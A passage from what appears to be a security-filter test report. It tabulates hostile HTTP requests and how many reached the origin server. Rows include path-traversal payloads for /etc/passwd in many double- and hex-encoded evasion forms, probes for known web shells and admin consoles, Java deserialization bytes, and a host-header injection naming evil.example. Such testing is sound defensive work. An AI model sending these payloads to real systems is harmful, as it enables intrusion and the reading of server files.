| ` java/variant-03527 ` | ` java/syntax-0176 ` | ` json-layout-20 ` | POST | ` /api/loadtest/java ` | ` {\n "input": "aced00057372"\n} ` | 97 |
| ` java/variant-03528 ` | ` java/syntax-0176 ` | ` json-layout-09 ` | POST | ` /api/loadtest/java ` | ` {\n\t"input": "aced00057372"\n} ` | 97 |

## Application probes

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` probe/209 ` | (original) | (original) | GET | ` /adminer.php ` | (empty) | 98 |
| ` probe/212 ` | (original) | (original) | GET | ` /server-status ` | (empty) | 98 |
| ` probe/213 ` | (original) | (original) | GET | ` /phpmyadmin/index.php ` | (empty) | 98 |
| ` probe/215 ` | (original) | (original) | GET | ` /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ` | (empty) | 98 |
| ` probe/217 ` | (original) | (original) | GET | ` /actuator/env ` | (empty) | 98 |
| ` probe/223 ` | (original) | (original) | GET | ` /info.php ` | (empty) | 98 |
| ` probe/224 ` | (original) | (original) | GET | ` /test.php ` | (empty) | 98 |
| ` probe/225 ` | (original) | (original) | GET | ` /shell.php ` | (empty) | 98 |
| ` probe/226 ` | (original) | (original) | GET | ` /c99.php ` | (empty) | 98 |
| ` probe/227 ` | (original) | (original) | GET | ` /wso.php ` | (empty) | 98 |
| ` probe/231 ` | (original) | (original) | GET | ` /_profiler/phpinfo ` | (empty) | 98 |
| ` probe/232 ` | (original) | (original) | GET | ` /console ` | (empty) | 98 |
| ` probe/233 ` | (original) | (original) | GET | ` /debug/default/view ` | (empty) | 98 |
| ` probe/234 ` | (original) | (original) | GET | ` /wp-admin/install.php?step=1 ` | (empty) | 98 |
| ` probe/235 ` | (original) | (original) | GET | ` /administrator/index.php?option=com_config ` | (empty) | 98 |
| ` probe/syntax-0389 ` | ` probe/syntax-family ` | ` syntax-diagnostic-path ` | GET | ` /actuator/env ` | (empty) | 98 |
| ` probe/syntax-0390 ` | ` probe/syntax-family ` | ` syntax-diagnostic-path ` | GET | ` /actuator/configprops ` | (empty) | 98 |
| ` probe/syntax-0393 ` | ` probe/syntax-family ` | ` syntax-diagnostic-path ` | GET | ` /adminer.php ` | (empty) | 98 |
| ` probe/syntax-0394 ` | ` probe/syntax-family ` | ` syntax-diagnostic-path ` | GET | ` /server-status ` | (empty) | 98 |
| ` probe/syntax-0395 ` | ` probe/syntax-family ` | ` syntax-diagnostic-path ` | GET | ` /phpmyadmin/ ` | (empty) | 98 |
| ` probe/syntax-0396 ` | ` probe/syntax-family ` | ` syntax-diagnostic-path ` | GET | ` /debug/vars ` | (empty) | 98 |
| ` probe/variant-01887 ` | ` probe/234 ` | ` query-encoded-name ` | GET | ` /wp-admin/install.php?%73%74%65%70=1 ` | (empty) | 97 |
| ` probe/variant-01888 ` | ` probe/234 ` | ` query-encoded-value ` | GET | ` /wp-admin/install.php?step=%31 ` | (empty) | 97 |
| ` probe/variant-01889 ` | ` probe/234 ` | ` query-encoded-both ` | GET | ` /wp-admin/install.php?%73%74%65%70=%31 ` | (empty) | 97 |
| ` probe/variant-01893 ` | ` probe/235 ` | ` query-encoded-name ` | GET | ` /administrator/index.php?%6F%70%74%69%6F%6E=com_config ` | (empty) | 97 |
| ` probe/variant-01894 ` | ` probe/235 ` | ` query-encoded-value ` | GET | ` /administrator/index.php?option=%63%6F%6D%5F%63%6F%6E%66%69%67 ` | (empty) | 97 |
| ` probe/variant-01895 ` | ` probe/235 ` | ` query-encoded-both ` | GET | ` /administrator/index.php?%6F%70%74%69%6F%6E=%63%6F%6D%5F%63%6F%6E%66%69%67 ` | (empty) | 97 |
| ` probe/variant-01896 ` | ` probe/235 ` | ` query-lower-hex ` | GET | ` /administrator/index.php?%6f%70%74%69%6f%6e=%63%6f%6d%5f%63%6f%6e%66%69%67 ` | (empty) | 97 |

## Local file inclusion

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` lfi/syntax-0076 ` | ` lfi/syntax-family ` | ` syntax-07-query ` | GET | ` /api/loadtest/lfi?input=%25252e%25252e%25252fetc%25252fpasswd ` | (empty) | 98 |
| ` lfi/syntax-0077 ` | ` lfi/syntax-family ` | ` syntax-07-form ` | POST | ` /api/loadtest/lfi ` | ` input=%25252e%25252e%25252fetc%25252fpasswd ` | 98 |
| ` lfi/syntax-0078 ` | ` lfi/syntax-family ` | ` syntax-07-json ` | POST | ` /api/loadtest/lfi ` | ` {"input":"%252e%252e%252fetc%252fpasswd"} ` | 98 |
| ` lfi/variant-03132 ` | ` lfi/syntax-0076 ` | ` query-encoded-name ` | GET | ` /api/loadtest/lfi?%69%6E%70%75%74=%25252e%25252e%25252fetc%25252fpasswd ` | (empty) | 97 |
| ` lfi/variant-03133 ` | ` lfi/syntax-0076 ` | ` query-encoded-value ` | GET | ` /api/loadtest/lfi?input=%25%32%35%32%65%25%32%35%32%65%25%32%35%32%66%65%74%63%25%32%35%32%66%70%61%73%73%77%64 ` | (empty) | 97 |
| ` lfi/variant-03134 ` | ` lfi/syntax-0076 ` | ` query-encoded-both ` | GET | ` /api/loadtest/lfi?%69%6E%70%75%74=%25%32%35%32%65%25%32%35%32%65%25%32%35%32%66%65%74%63%25%32%35%32%66%70%61%73%73%77%64 ` | (empty) | 97 |
| ` lfi/variant-03135 ` | ` lfi/syntax-0076 ` | ` query-lower-hex ` | GET | ` /api/loadtest/lfi?%69%6e%70%75%74=%25%32%35%32%65%25%32%35%32%65%25%32%35%32%66%65%74%63%25%32%35%32%66%70%61%73%73%77%64 ` | (empty) | 97 |
| ` lfi/variant-03136 ` | ` lfi/syntax-0077 ` | ` form-encoded-name ` | POST | ` /api/loadtest/lfi ` | ` %69%6E%70%75%74=%25252e%25252e%25252fetc%25252fpasswd ` | 97 |
| ` lfi/variant-03137 ` | ` lfi/syntax-0077 ` | ` form-encoded-value ` | POST | ` /api/loadtest/lfi ` | ` input=%25%32%35%32%65%25%32%35%32%65%25%32%35%32%66%65%74%63%25%32%35%32%66%70%61%73%73%77%64 ` | 97 |
| ` lfi/variant-03138 ` | ` lfi/syntax-0077 ` | ` form-encoded-both ` | POST | ` /api/loadtest/lfi ` | ` %69%6E%70%75%74=%25%32%35%32%65%25%32%35%32%65%25%32%35%32%66%65%74%63%25%32%35%32%66%70%61%73%73%77%64 ` | 97 |
| ` lfi/variant-03139 ` | ` lfi/syntax-0077 ` | ` form-lower-hex ` | POST | ` /api/loadtest/lfi ` | ` %69%6e%70%75%74=%25%32%35%32%65%25%32%35%32%65%25%32%35%32%66%65%74%63%25%32%35%32%66%70%61%73%73%77%64 ` | 97 |
| ` lfi/variant-03140 ` | ` lfi/syntax-0078 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/lfi ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0025\u0032\u0035\u0032\u0065\u0025\u0032\u0035\u0032\u0065\u0025\u0032\u0035\u0032\u0066\u0065\u0074\u0063\u0025\u0032\u0035\u0032\u0066\u0070\u0061\u0073\u0073\u0077\u0064"} ` | 97 |
| ` lfi/variant-03141 ` | ` lfi/syntax-0078 ` | ` json-layout-20 ` | POST | ` /api/loadtest/lfi ` | ` {\n "input": "%252e%252e%252fetc%252fpasswd"\n} ` | 97 |
| ` lfi/variant-03142 ` | ` lfi/syntax-0078 ` | ` json-layout-09 ` | POST | ` /api/loadtest/lfi ` | ` {\n\t"input": "%252e%252e%252fetc%252fpasswd"\n} ` | 97 |

## WordPress paths

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` wordpress/242 ` | (original) | (original) | GET | ` /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php ` | (empty) | 98 |
| ` wordpress/244 ` | (original) | (original) | GET | ` /wp-content/plugins/revslider/temp/update_extract/revslider/shell.php ` | (empty) | 98 |
| ` wordpress/245 ` | (original) | (original) | GET | ` /wp-content/plugins/wp-file-manager/lib/files/shell.php ` | (empty) | 98 |
| ` wordpress/syntax-0397 ` | ` wordpress/syntax-family ` | ` syntax-plugin-upload-path ` | GET | ` /wp-content/uploads/test.php ` | (empty) | 98 |
| ` wordpress/syntax-0398 ` | ` wordpress/syntax-family ` | ` syntax-plugin-upload-path ` | GET | ` /wp-content/uploads/test.phtml ` | (empty) | 98 |
| ` wordpress/syntax-0399 ` | ` wordpress/syntax-family ` | ` syntax-plugin-upload-path ` | GET | ` /wp-content/cache/test.php ` | (empty) | 98 |
| ` wordpress/syntax-0400 ` | ` wordpress/syntax-family ` | ` syntax-plugin-upload-path ` | GET | ` /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php ` | (empty) | 98 |
| ` wordpress/syntax-0401 ` | ` wordpress/syntax-family ` | ` syntax-plugin-upload-path ` | GET | ` /wp-content/plugins/revslider/temp/update_extract/revslider/shell.php ` | (empty) | 98 |

## Scanner identifiers

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` scanner/192 ` | (original) | (original) | GET | ` / ` | ` User-Agent: dirsearch/0.4.3 ` | 98 |
| ` scanner/198 ` | (original) | (original) | GET | ` / ` | ` User-Agent: jaeles ` | 98 |

## Protocol/header probes

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` protocol/239 ` | (original) | (original) | GET | ` / ` | ` X-Forwarded-Host: evil.example\r\nx: y ` | 98 |
